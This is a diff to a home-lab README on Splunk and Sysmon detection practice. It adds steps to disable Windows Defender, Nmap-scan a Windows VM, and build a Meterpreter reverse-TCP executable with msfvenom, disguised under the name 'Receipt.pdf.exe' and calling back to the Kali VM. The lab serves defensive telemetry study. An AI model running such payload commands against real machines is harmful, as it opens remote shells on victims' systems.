@@ -50,4 +50,35 @@ The Experimenting with Splunk & Sysmon project is where I will be documenting th
 <img width="862" height="603" alt="Pasted image 20251021223015" src="https://github.com/user-attachments/assets/51a851e1-d70f-4657-8012-25a58b3fdc7c" />
 
 ## Generating Telemetry
-- This is a placeholder section title that may get changed in the future depending on how I proceed with the project
+- I started by moving the Windows 11 VM back into the internal network and changing the IPv4 address back to **10.1.1.2**
+- I also increased the memory to 7 GB in both the Windows 11 and Kali Linux VMs
+### Scanning the Windows VM with Nmap
+- The first step here is to disable Windows Defender to allow the scan to go through and later the crafted malware to not be blocked
+- I also went into Windows settings to enable Remote Desktop Protocol (RDP):
+<img width="1213" height="406" alt="Pasted image 20251022191043" src="https://github.com/user-attachments/assets/ee347660-abfc-4713-9d2b-85ea0ccaf587" />
+
+- Now on to the actual Nmap scan, the command used was `nmap -A 10.1.1.2 -Pn`
+- The **-A** flag is for a more in depth scan that enables OS and version detection, script scanning, and traceroute
+- The **-Pn** flag skips host discovery and assumes the host is online which is true in this case
+- The resulting scan returned that there were 6 open ports out of 1000:
+<img width="698" height="563" alt="Pasted image 20251022193145" src="https://github.com/user-attachments/assets/840b945f-0802-4047-ac83-a9ac650d41fe" />
+
+- Port 3389 is the RDP port and other notable ports are 8000 and 8089 which are both used by Splunk that was installed earlier in the project
+- Obviously I knew that the RDP port would be open but chose to still use Nmap to simulate performing reconnaissance and ensure the port was open/reachable by the Kali VM
+### Setting Up Malware on the Kali VM
+- The malware payload will be created using MSFvenom on the Kali VM
+- After launching a terminal, I used `msfvenom -l payloads` to view a list of possible payloads to be used during the test
+- For this test, I will be using the `windows/x64/meterpreter_reverse_tcp` payload:
+<img width="847" height="440" alt="Pasted image 20251022202708" src="https://github.com/user-attachments/assets/00f2875b-60cf-4f65-9973-4dbbc098d54f" />
+
+- Now to build the malware, I used the command `msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.1.1.3 lport=4444 -f exe -o Receipt.pdf.exe`
+- Each flag in the command is used to customize the malware for this specific use case:
+	- **-p** designates the payload being used
+	- **lhost** is the local host IP (the Kali VM for this use)
+	- **lport** is the local port being used (4444 is the default meterpreter port)
+	- **-f** is for the output format (I am making an executable)
+	- **-o** is for the output path (Receipt.pdf.exe)
+- So the malware output will be a meterpreter reverse tcp payload that will communicate back to the Kali VM through port 4444:
+<img width="847" height="156" alt="Pasted image 20251022221551" src="https://github.com/user-attachments/assets/468134ba-98bd-4965-8c10-8a8f182b6846" />
+
+- Current progress, will be updated with the execution of the malware
